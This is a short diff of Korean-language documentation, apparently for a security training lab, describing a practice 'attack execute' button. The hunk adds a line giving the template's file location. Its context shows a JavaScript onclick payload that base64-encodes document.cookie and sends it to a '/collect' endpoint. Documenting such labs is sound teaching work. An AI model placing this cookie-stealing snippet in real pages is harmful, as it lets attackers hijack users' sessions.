@@ -52,6 +52,7 @@ app.config.update(
 ```
 
 ### 2.3 실습용 '공격 실행' 버튼 메커니즘
+- **파일 위치**: `was/app/templates/posts/list.html` ([L54-L59](file:///c:/workspace/PJT2/was/app/templates/posts/list.html#L54-L59))
 - **실행 코드**: 
   ```javascript
   onclick="fetch('/collect?cookie=' + btoa(document.cookie))"
